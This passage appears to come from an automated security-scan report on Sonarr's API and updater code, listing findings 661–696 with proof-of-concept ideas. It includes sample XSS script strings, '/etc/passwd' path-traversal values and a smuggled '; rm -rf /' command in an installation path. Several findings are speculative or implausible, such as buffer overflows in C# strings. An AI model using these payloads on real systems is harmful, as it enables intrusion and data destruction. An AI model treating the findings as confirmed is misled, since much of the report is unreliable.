The LogFileResource contains filename and contentsUrl fields that are not properly escaped when returned in API responses, potentially allowing XSS attacks.

**Evidence:**
```
LogFileResource contains Filename field that is directly populated from file system without HTML escaping, and ContentsUrl field that may contain unescaped user data.
```

**Impact:**
An attacker could inject malicious JavaScript into log file names or URLs that would execute in the context of the Sonarr web interface when users view log files.

**Proof of Concept:**
If a log file name contains '<script>alert(1)</script>' and is returned in the API response, this could be executed when the UI displays the filename.

**How to Test:**
Create log files with special characters and JavaScript in their names, then check if these are properly escaped in API responses.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 662. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/Sonarr.Api.V5/Queue/QueueController.cs
**Line:** 100

**Description:**
The QueueController endpoints lack CSRF protection, making them vulnerable to cross-site request forgery attacks.

**Evidence:**
```
Multiple endpoints in QueueController (RemoveAction, RemoveMany) accept POST/DELETE requests without CSRF token validation.
```

**Impact:**
An attacker could trick authenticated users into performing unwanted actions like removing items from the queue or changing download status.

**Proof of Concept:**
An attacker could create a malicious webpage that automatically sends a DELETE request to /api/v1/queue/{id} to remove queue items without user consent.

**How to Test:**
Check if API endpoints accept requests without proper CSRF tokens and verify if requests can be forged from external domains.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrApiV5_Queue_QueueControllercs.py`
---

### 663. Command Injection (CWE-77)

**File:** src/Sonarr.Api.V5/Commands/CommandController.cs
**Line:** 60

**Description:**
The StartCommand method deserializes command bodies from JSON without proper validation, potentially allowing command injection.

**Evidence:**
```
Command body is deserialized using STJson.Deserialize without validating the command type or content before execution.
```

**Impact:**
An attacker could inject malicious commands by crafting a specially formatted command body that gets executed by the system.

**Proof of Concept:**
An attacker could send a command body with malicious command parameters that get executed during command processing.

**How to Test:**
Send crafted command bodies with unexpected parameters and verify if they are properly validated before execution.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_SonarrApiV5_Commands_CommandControllercs.py`
---

### 664. Improper Control of Dynamically-Generated Code Resources (CWE-913)

**File:** src/Sonarr.Api.V5/Commands/CommandController.cs
**Line:** 50

**Description:**
The StartCommand method dynamically loads command types based on user input without proper validation, potentially allowing arbitrary command execution.

**Evidence:**
```
Command type is determined by user input and loaded using reflection without validating against allowed command types.
```

**Impact:**
An attacker could potentially execute arbitrary commands by specifying command types that are not intended to be available.

**Proof of Concept:**
An attacker could specify a command name that maps to a command type not in the allowed list, potentially executing unintended code.

**How to Test:**
Try submitting commands with command names that don't correspond to valid command types and verify if they are accepted.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_SonarrApiV5_Commands_CommandControllercs.py`
---

### 665. Deserialization of Untrusted Data (CWE-502)

**File:** src/Sonarr.Api.V5/Commands/CommandController.cs
**Line:** 50

**Description:**
The StartCommand method deserializes command bodies from JSON without proper validation, potentially allowing insecure deserialization.

**Evidence:**
```
Command body is deserialized using STJson.Deserialize without validating the deserialized object structure or content.
```

**Impact:**
An attacker could craft malicious command payloads that, when deserialized, could lead to code execution or information disclosure.

**Proof of Concept:**
An attacker could craft a command body with malicious serialized objects that get executed during command processing.

**How to Test:**
Send specially crafted command bodies with malicious serialized data and verify if they are properly validated.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrApiV5_Commands_CommandControllercs.py`
---

### 666. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 54

**Description:**
The LogFileResource mapping process could be vulnerable to buffer overflow issues when handling very long filenames or content URLs.

**Evidence:**
```
LogFileResource fields are populated directly from file system data without size validation or buffer bounds checking.
```

**Impact:**
Very long filenames or URLs could cause buffer overflows in the API response handling, potentially leading to crashes or code execution.

**Proof of Concept:**
Create log files with extremely long names and verify if the API response handling properly validates string lengths.

**How to Test:**
Test with extremely long filenames and content URLs to verify buffer handling and potential overflow conditions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 667. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 54

**Description:**
The LogFileResource mapping process doesn't validate the size of input data before copying to response fields, potentially leading to buffer overflows.

**Evidence:**
```
Fields in LogFileResource are populated directly from file system data without size validation.
```

**Impact:**
Large log file names or content URLs could cause buffer overflows when copied to response fields.

**Proof of Concept:**
Create log files with very long names and verify if the API response handling properly validates input sizes.

**How to Test:**
Test with log files having very long names and verify if buffer overflow occurs during response generation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 668. Insecure Data Storage (CWE-312)

**File:** src/Sonarr.Api.V5/Logs/LogFileControllerBase.cs
**Line:** 54

**Description:**
Log file contents are returned in API responses without proper sanitization, potentially exposing sensitive information.

**Evidence:**
```
The GetLogFileResponse method returns raw file contents without sanitizing for sensitive data or special characters.
```

**Impact:**
Log files might contain sensitive information like passwords, API keys, or internal system details that get exposed through the API.

**Proof of Concept:**
A log file containing API keys or passwords could be returned in plain text through the API response.

**How to Test:**
Check if log files containing sensitive information are returned in plain text without sanitization.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrApiV5_Logs_LogFileControllerBasecs.py`
---

### 669. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V5/RemotePathMappings/RemotePathMappingController.cs
**Line:** 45

**Description:**
The RemotePathMappingController validates RemotePath but does not validate Host field for potential injection vulnerabilities or path traversal issues.

**Evidence:**
```
The validation rules for RemotePath include checks for leading/trailing spaces but do not validate Host field for special characters or path traversal sequences.
```

**Impact:**
Malicious Host values could lead to path traversal or injection vulnerabilities when these paths are used in file operations or system commands.

**Proof of Concept:**
An attacker could submit a Host value like '../../../../etc/passwd' which might be used in file operations without proper sanitization.

**How to Test:**
1. Send a POST request to /api/v5/remotepathmapping with Host field containing path traversal sequences
2. Check if the Host value is properly sanitized before being used in file operations
3. Test with special characters that could be interpreted as shell commands

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV5_RemotePathMappings_RemotePathMappingControllercs.py`
---

### 670. Path Traversal (CWE-22)

**File:** src/NzbDrone.Update/UpdateEngine/InstallUpdateService.cs
**Line:** 108

**Description:**
The InstallUpdateService class performs file operations using paths that are not properly validated against directory traversal attacks.

**Evidence:**
```
The MirrorFolder method is called with paths from _appFolderInfo.GetUpdatePackageFolder() and installationFolder without proper validation to prevent directory traversal.
```

**Impact:**
An attacker could potentially write files outside the intended directory by manipulating paths during the update process, leading to arbitrary file creation or modification.

**Proof of Concept:**
An attacker could create an update package with files having paths like '../../../../etc/passwd' that would be written to unintended locations during the update process.

**How to Test:**
1. Create an update package with files having path traversal sequences
2. Run the update process
3. Verify if files are written to unintended locations
4. Check if the update process validates paths before file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneUpdate_UpdateEngine_InstallUpdateServicecs.py`
---

### 671. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Update/UpdateEngine/StartNzbDrone.cs
**Line:** 50

**Description:**
The StartNzbDrone class spawns processes using paths that are not properly escaped or validated, potentially leading to command injection.

**Evidence:**
```
The Start method in StartNzbDrone.cs calls _processProvider.SpawnNewProcess with paths that are not validated or escaped for shell injection.
```

**Impact:**
If the installation directory path contains special shell characters, it could lead to command injection when spawning new processes.

**Proof of Concept:**
An attacker could set up an installation directory path with shell metacharacters like '; rm -rf /' that would be executed when Sonarr starts.

**How to Test:**
1. Set up an installation directory with special shell characters in the path
2. Trigger the update process
3. Monitor if shell injection occurs during process spawning
4. Verify path validation in StartNzbDrone.cs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneUpdate_UpdateEngine_StartNzbDronecs.py`
---

### 672. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Update/UpdateEngine/InstallUpdateService.cs
**Line:** 118

**Description:**
The update process creates backup files without proper encryption or access control, potentially exposing sensitive data.

**Evidence:**
```
The backup process copies database and config files to backup locations without encryption or access control measures.
```

**Impact:**
Backup files containing sensitive configuration data or database contents could be accessed by unauthorized users if the backup directory has weak permissions.

**Proof of Concept:**
An attacker with access to the backup directory could read backup files containing database contents or configuration settings.

**How to Test:**
1. Run the update process
2. Check permissions on backup files created in the backup directory
3. Verify if backup files contain sensitive information
4. Test access to backup files without proper authentication

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneUpdate_UpdateEngine_InstallUpdateServicecs.py`
---

### 673. Improper Authentication (CWE-287)

**File:** src/Sonarr.Api.V5/RemotePathMappings/RemotePathMappingController.cs
**Line:** 30

**Description:**
The RemotePathMappingController lacks explicit authentication checks for its endpoints, potentially allowing unauthorized access to remote path mapping operations.

**Evidence:**
```
The controller is decorated with [V5ApiController] but does not explicitly check authentication for its endpoints, relying on the API framework for authentication.
```

**Impact:**
Unauthorized users could potentially create, update, or delete remote path mappings, affecting how Sonarr accesses files on remote systems.

**Proof of Concept:**
An attacker could send requests to /api/v5/remotepathmapping endpoints without proper authentication and modify remote path mappings.

**How to Test:**
1. Send requests to /api/v5/remotepathmapping endpoints without authentication
2. Verify if unauthorized access is allowed
3. Test if modifications to remote path mappings are possible
4. Check authentication middleware configuration

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_SonarrApiV5_RemotePathMappings_RemotePathMappingControllercs.py`
---

### 674. Improper Validation of Array Index (CWE-129)

**File:** src/Sonarr.Api.V3/ProviderControllerBase.cs
**Line:** 150

**Description:**
The UpdateProvider method in ProviderControllerBase uses array indices without proper bounds checking, potentially leading to array index out of bounds errors.

**Evidence:**
```
The UpdateProvider method processes provider resources and uses array operations without validating array bounds before accessing elements.
```

**Impact:**
An attacker could potentially cause array index out of bounds exceptions or access unauthorized memory locations through malformed provider data.

**Proof of Concept:**
An attacker could submit provider data with malformed arrays that would cause index out of bounds errors during processing.

**How to Test:**
1. Send provider data with arrays that exceed expected bounds
2. Monitor for array index out of bounds exceptions
3. Test with empty or oversized arrays
4. Verify array bounds checking in ProviderControllerBase.cs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_SonarrApiV3_ProviderControllerBasecs.py`
---

### 675. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Console/ConsoleApp.cs
**Line:** 36

**Description:**
The ConsoleApp class uses string formatting with potentially externally-controlled input without proper validation.

**Evidence:**
```
The NzbDroneLogger.Register method is called with startup arguments that could contain format string specifiers.
```

**Impact:**
If startup arguments contain format string specifiers, they could be used to manipulate logging output or potentially cause injection attacks.

**Proof of Concept:**
An attacker could pass startup arguments containing format string specifiers that would be used in logging output.

**How to Test:**
1. Start Sonarr with startup arguments containing format string specifiers
2. Monitor logging output for format string injection
3. Test with various format string characters
4. Verify if logging properly handles externally-controlled format strings

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneConsole_ConsoleAppcs.py`
---

### 676. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The OpenAPI specification defines parameters without proper validation rules, potentially allowing malicious input to be processed by the API endpoints.

**Evidence:**
```
Several endpoints accept path parameters with schema type 'string' but no validation constraints like minimum/maximum length, pattern matching, or enum restrictions. For example, the '/api/v3/config/mediamanagement/{id}' endpoint accepts 'id' as a string without validation.
```

**Impact:**
Malicious actors could potentially exploit endpoints by sending unexpected parameter values that might cause unexpected behavior or trigger validation bypasses in the backend implementation.

**Proof of Concept:**
An attacker could send a request to '/api/v3/config/mediamanagement/../../../../etc/passwd' where the 'id' parameter contains path traversal sequences, potentially allowing access to system files if the backend doesn't properly validate this input.

**How to Test:**
Test various API endpoints with malformed parameters (very long strings, special characters, path traversal sequences) to see if the API accepts them without validation errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_openapijson.py`
---

### 677. Path Traversal (CWE-22)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification allows path parameters that could be vulnerable to path traversal attacks when processed by the backend implementation.

**Evidence:**
```
The '/content/{path}' endpoint accepts a path parameter with pattern validation '^(?!api/).*' but doesn't enforce strict path validation. The '/{path}' endpoint also accepts path parameters with pattern '^(?!(api|feed)/).*' which could allow traversal sequences.
```

**Impact:**
If the backend implementation doesn't properly sanitize path parameters, attackers could access files outside the intended directory structure, potentially leading to information disclosure or arbitrary file access.

**Proof of Concept:**
A request to '/content/../../../etc/passwd' could potentially allow an attacker to read system files if the backend doesn't properly validate the path parameter.

**How to Test:**
Test endpoints with path parameters containing traversal sequences like '../', '../../', etc. Verify that the backend properly sanitizes these paths before accessing files.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV3_openapijson.py`
---

### 678. Cross-Site Scripting (XSS) (CWE-79)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define proper input sanitization for parameters that might be reflected in responses, potentially leading to XSS vulnerabilities.

**Evidence:**
```
Several endpoints accept string parameters (like 'title', 'path', 'name') that could be reflected in API responses without proper HTML escaping. The specification doesn't include validation rules to prevent XSS in these fields.
```

**Impact:**
If the API responses include user-provided strings without proper sanitization, attackers could inject malicious scripts that execute in the context of authenticated users.

**Proof of Concept:**
If an endpoint accepts a 'title' parameter and returns it in JSON responses without proper escaping, an attacker could inject script tags that would execute when the response is consumed by a web application.

**How to Test:**
Send requests with XSS payloads in string parameters and verify if the responses contain unescaped content that could lead to script execution.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV3_openapijson.py`
---

### 679. Sensitive Data Exposure (CWE-312)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification doesn't explicitly define sensitive data handling for configuration endpoints, potentially exposing sensitive information.

**Evidence:**
```
Configuration endpoints like '/api/v3/config/mediamanagement/{id}' and '/api/v3/config/naming/{id}' accept configuration data that may contain sensitive information (passwords, API keys, etc.) without explicit schema definitions for sensitive fields.
```

**Impact:**
Sensitive configuration data might be exposed in API responses or logs without proper redaction, potentially leading to credential exposure.

**Proof of Concept:**
When updating configuration via PUT requests to config endpoints, sensitive fields might be returned in responses without proper redaction, exposing passwords or API keys.

**How to Test:**
Test configuration endpoints with sensitive data and verify that sensitive fields are properly redacted in responses or that the API doesn't expose them unnecessarily.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrApiV3_openapijson.py`
---

### 680. Improper Authentication (CWE-287)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification doesn't explicitly define authentication requirements for endpoints, potentially leading to unauthenticated access to sensitive operations.

**Evidence:**
```
While the API has various endpoints for configuration, system management, and content management, there's no explicit authentication requirement defined in the OpenAPI specification. The specification doesn't define security schemes or authentication requirements for endpoints.
```

**Impact:**
Endpoints that should require authentication might be accessible without proper authentication, allowing unauthorized access to system configuration, file management, and other sensitive operations.

**Proof of Concept:**
An attacker could access system configuration endpoints like '/api/v3/system/status' or '/api/v3/config/ui' without authentication, potentially gaining insights into system configuration or even modifying settings.

**How to Test:**
Test various API endpoints without authentication and verify if they return sensitive information or allow modifications that should require authentication.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_SonarrApiV3_openapijson.py`
---

### 681. Improper Control of Dynamically-Generated Code Resources (CWE-913)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification allows dynamic parameter handling that could lead to code injection or resource manipulation vulnerabilities.

**Evidence:**
```
The specification defines endpoints that accept dynamic parameters (like 'name' in action endpoints) without strict validation. The '/api/v3/notification/action/{name}' and '/api/v3/metadata/action/{name}' endpoints accept arbitrary action names that could be manipulated.
```

**Impact:**
If the backend implementation doesn't properly validate action names or parameters, attackers could potentially trigger unexpected behavior or manipulate system operations through crafted parameters.

**Proof of Concept:**
An attacker could send a request to '/api/v3/notification/action/../../../etc/passwd' where the action name contains path traversal sequences, potentially triggering unexpected behavior in the notification system.

**How to Test:**
Test action endpoints with various parameter values including special characters, path traversal sequences, and potentially malicious inputs to see if they cause unexpected behavior.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_SonarrApiV3_openapijson.py`
---

### 682. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define proper data integrity verification mechanisms for API requests and responses.

**Evidence:**
```
No cryptographic signatures, checksums, or integrity verification mechanisms are defined for API data exchange in the OpenAPI specification.
```

**Impact:**
Data integrity cannot be verified, making it possible for attackers to modify API requests or responses without detection, potentially leading to data corruption or unauthorized actions.

**Proof of Concept:**
An attacker could modify a request to change a series ID or quality profile without the system detecting the tampering, potentially causing incorrect processing.

**How to Test:**
Test API requests with modified data to verify if the system detects or validates data integrity, and check if response data can be tampered with without detection.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_SonarrApiV3_openapijson.py`
---

### 683. Deserialization of Untrusted Data (CWE-502)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification defines complex data structures that could be vulnerable to deserialization attacks when processed by the backend.

**Evidence:**
```
The specification includes complex nested objects with arrays and references to other schemas, which could be vulnerable to deserialization attacks if not properly validated.
```

**Impact:**
If the backend doesn't properly validate deserialized data, attackers could exploit deserialization vulnerabilities to execute arbitrary code or cause denial of service.

**Proof of Concept:**
If the API accepts a complex JSON structure with nested objects and the backend doesn't validate the structure, an attacker could craft a malicious payload that triggers deserialization vulnerabilities.

**How to Test:**
Test API endpoints with complex nested JSON structures, including malformed data, deeply nested objects, and circular references to verify proper deserialization handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrApiV3_openapijson.py`
---

### 684. Cross-site Scripting (XSS) (CWE-79)

**File:** src/Sonarr.Api.V3/Indexers/ReleaseResource.cs
**Line:** 100

**Description:**
The ReleaseResource class contains user-controllable data that is not properly sanitized before being returned in API responses, potentially leading to XSS vulnerabilities when this data is consumed by web applications.

**Evidence:**
```
The ReleaseResource class contains properties like Title, ReleaseGroup, SeriesTitle, and others that can contain user-provided data without proper sanitization before being serialized to JSON.
```

**Impact:**
An attacker could inject malicious JavaScript code through release titles or other fields that are returned in API responses, which could be executed in the context of a victim's browser when the API response is consumed.

**Proof of Concept:**
If an indexer sends a release with Title = '<script>alert("XSS")</script>' and this gets returned in the API response, any web application consuming this API could be vulnerable to XSS.

**How to Test:**
Send a release with malicious content in Title, ReleaseGroup, or other string fields through the ReleasePushController and verify if the response contains unsanitized user input.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV3_Indexers_ReleaseResourcecs.py`
---

### 685. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Indexers/ReleasePushController.cs
**Line:** 60

**Description:**
The Create method in ReleasePushController accepts ReleaseResource objects without sufficient validation of all input fields, potentially allowing malformed data to be processed.

**Evidence:**
```
The method calls ValidateResource(release) but doesn't validate all fields in the ReleaseResource object, particularly fields that are not explicitly validated in the PostValidator rules.
```

**Impact:**
Malformed input could cause unexpected behavior, data corruption, or lead to downstream processing errors when the release information is used for decision making.

**Proof of Concept:**
Send a ReleaseResource with invalid or missing values in fields like PublishDate, Title, or DownloadUrl that are not strictly validated, which could cause processing failures or incorrect decisions.

**How to Test:**
Send a ReleaseResource with missing or malformed fields through the POST /release/push endpoint and observe if the application handles these gracefully or throws exceptions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Indexers_ReleasePushControllercs.py`
---

### 686. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V3/Indexers/ReleaseResource.cs
**Line:** 100

**Description:**
The ReleaseResource class uses string properties that could be vulnerable to buffer overflows when handling large inputs, particularly in scenarios involving string concatenation or parsing.

**Evidence:**
```
The class contains multiple string properties that are not validated for maximum length, and the ToModel method processes these strings without bounds checking.
```

**Impact:**
Large input strings could cause buffer overflows during processing, potentially leading to application crashes or memory corruption.

**Proof of Concept:**
Send a ReleaseResource with extremely long strings in Title, ReleaseGroup, or other fields that could exceed buffer limits during processing.

**How to Test:**
Send a ReleaseResource with very long strings (e.g., 100KB+) in various fields and monitor for application crashes or unexpected behavior.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV3_Indexers_ReleaseResourcecs.py`
---

### 687. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/Sonarr.Api.V3/Indexers/ReleasePushController.cs
**Line:** 70

**Description:**
The Create method in ReleasePushController has limited exception handling for the decision making process, potentially leading to unhandled exceptions that could crash the application.

**Evidence:**
```
The method uses lock (PushLock) { ... } but doesn't have comprehensive try-catch blocks around the decision making and processing steps.
```

**Impact:**
An unhandled exception during the decision making process could cause the application to crash or leave the system in an inconsistent state.

**Proof of Concept:**
Trigger an exception during the _downloadDecisionMaker.GetRssDecision or _downloadDecisionProcessor.ProcessDecision calls to see if it's properly handled.

**How to Test:**
Force an exception during the decision making process by mocking the decision maker or processor and verify that the application handles it gracefully.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_SonarrApiV3_Indexers_ReleasePushControllercs.py`
---

### 688. Path Traversal (CWE-22)

**File:** src/Sonarr.Api.V3/Series/SeriesController.cs
**Line:** 200

**Description:**
The SeriesController handles path inputs that could be vulnerable to path traversal attacks when processing series paths.

**Evidence:**
```
The controller uses Path property from SeriesResource without sufficient validation or sanitization, which could allow path traversal in file operations.
```

**Impact:**
An attacker could manipulate series paths to access files outside of the intended directory structure, potentially leading to information disclosure or arbitrary file access.

**Proof of Concept:**
Create or update a series with a path like '../../../../etc/passwd' and verify if the application allows this path traversal or if it gets sanitized properly.

**How to Test:**
Send a POST or PUT request to create or update a series with a path containing directory traversal sequences and check if the application properly validates or sanitizes the path.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV3_Series_SeriesControllercs.py`
---

### 689. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/Sonarr.Api.V3/Indexers/ReleaseResource.cs
**Line:** 100

**Description:**
The ReleaseResource class uses string properties that are not validated for maximum length, potentially leading to buffer overflows when processing large inputs.

**Evidence:**
```
Multiple string properties in ReleaseResource class (Title, ReleaseGroup, SeriesTitle, etc.) are not validated for maximum length before processing.
```

**Impact:**
Processing large inputs could cause buffer overflows, leading to application crashes or memory corruption.

**Proof of Concept:**
Send a release with extremely long strings in various fields and observe if the application handles them without buffer overflow issues.

**How to Test:**
Send ReleaseResource objects with very long strings in Title, ReleaseGroup, and other fields to test buffer handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_SonarrApiV3_Indexers_ReleaseResourcecs.py`
---

### 690. Sensitive Data in Memory (CWE-312)

**File:** src/Sonarr.Api.V3/Indexers/ReleasePushController.cs
**Line:** 30

**Description:**
The ReleasePushController creates ReleaseInfo objects that may contain sensitive data in memory without proper sanitization.

**Evidence:**
```
The controller creates ReleaseInfo objects from ReleaseResource input that may contain sensitive information like magnet URLs or download URLs.
```

**Impact:**
Sensitive information in memory could be exposed through memory dumps or other memory analysis techniques.

**Proof of Concept:**
Monitor memory during release processing to see if sensitive URLs or data remain in memory after processing.

**How to Test:**
Monitor memory usage during release processing and check if sensitive data remains accessible in memory after the processing completes.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_SonarrApiV3_Indexers_ReleasePushControllercs.py`
---

### 691. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/Sonarr.Api.V3/Indexers/ReleasePushController.cs
**Line:** 50

**Description:**
The ReleasePushController endpoint lacks CSRF protection, making it vulnerable to cross-site request forgery attacks.

**Evidence:**
```
The endpoint is decorated with [HttpPost] and [Consumes("application/json")] but doesn't implement CSRF token validation.
```

**Impact:**
An attacker could trick a user into sending a malicious release push request to the Sonarr instance, potentially causing unwanted downloads or processing.

**Proof of Concept:**
Create a malicious web page that automatically sends a POST request to /api/v3/release/push with crafted release data.

**How to Test:**
Create a test page that sends a POST request to the release push endpoint and verify if the application accepts requests without CSRF validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrApiV3_Indexers_ReleasePushControllercs.py`
---

### 692. Improper Authentication (CWE-287)

**File:** src/Sonarr.Api.V3/Indexers/ReleasePushController.cs
**Line:** 50

**Description:**
The ReleasePushController endpoint may lack proper authentication, allowing unauthorized access to release push functionality.

**Evidence:**
```
The endpoint is decorated with [V3ApiController("release/push")] but doesn't explicitly require authentication tokens or API keys.
```

**Impact:**
Unauthorized users could push releases to Sonarr, potentially leading to unwanted downloads or processing of malicious releases.

**Proof of Concept:**
Send a release push request without proper authentication and verify if the system accepts it.

**How to Test:**
Send a release push request without authentication headers and check if the endpoint accepts the request.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_SonarrApiV3_Indexers_ReleasePushControllercs.py`
---

### 693. Deserialization of Untrusted Data (CWE-502)

**File:** src/Sonarr.Api.V3/CustomFilters/CustomFilterResource.cs
**Line:** 30

**Description:**
The CustomFilterResource uses ExpandoObject for filters which could be vulnerable to deserialization attacks when processing untrusted input.

**Evidence:**
```
The Filters property uses List<ExpandoObject> which can be deserialized from untrusted JSON input without proper validation.
```

**Impact:**
Maliciously crafted filter data could lead to deserialization vulnerabilities, potentially allowing remote code execution or information disclosure.

**Proof of Concept:**
Send a custom filter with malicious ExpandoObject data that could be exploited during deserialization.

**How to Test:**
Send a custom filter with crafted ExpandoObject data and verify if the application properly handles the deserialization without vulnerabilities.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrApiV3_CustomFilters_CustomFilterResourcecs.py`
---

### 694. Cross-site Scripting (CWE-79)

**File:** src/Sonarr.Api.V3/Calendar/CalendarFeedController.cs
**Line:** 83

**Description:**
The calendar feed controller does not properly sanitize user input when generating iCalendar events, potentially allowing XSS attacks through episode descriptions and series network information.

**Evidence:**
```
The code uses episode.Overview directly in occurrence.Description without sanitization, and series.Network in occurrence.Categories without sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript into episode descriptions or series networks, which would be executed when users view the calendar feed in iCalendar clients.

**Proof of Concept:**
An attacker could create an episode with overview containing '<script>alert("XSS")</script>' or set a series network to 'Network<script>alert("XSS")</script>'. When the calendar feed is generated, this JavaScript would be embedded in the iCalendar output.

**How to Test:**
1. Create an episode with malicious JavaScript in the overview field
2. Generate a calendar feed using the GetCalendarFeed endpoint
3. Parse the resulting iCalendar output to verify JavaScript execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV3_Calendar_CalendarFeedControllercs.py`
---

### 695. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Calendar/CalendarFeedController.cs
**Line:** 26

**Description:**
The tags parameter in GetCalendarFeed method is not properly validated before being used to query tags, potentially leading to injection or unexpected behavior.

**Evidence:**
```
The code splits tags by comma and directly uses the result from _tagService.GetTag without validating the tag IDs or checking for invalid inputs.
```

**Impact:**
Malformed tag input could cause exceptions or unexpected behavior in tag-based filtering.

**Proof of Concept:**
Passing malformed tags parameter like '1,2,invalid,4' to GetCalendarFeed could cause issues when _tagService.GetTag is called with invalid tag names.

**How to Test:**
1. Call GetCalendarFeed with tags parameter containing invalid tag identifiers
2. Monitor for exceptions or unexpected filtering behavior
3. Verify that invalid tags don't break the entire calendar generation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Calendar_CalendarFeedControllercs.py`
---

### 696. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Calendar/CalendarController.cs
**Line:** 34

**Description:**
The tags parameter in GetCalendar method is not properly validated before being used to query tags, potentially leading to injection or unexpected behavior.

**Evidence:**
```
The code splits tags by comma and directly uses the result from _tagService.GetTag without validating the tag IDs or checking for invalid inputs.
```

**Impact:**
Malformed tag input could cause exceptions or unexpected behavior in tag-based filtering.

**Proof of Concept:**
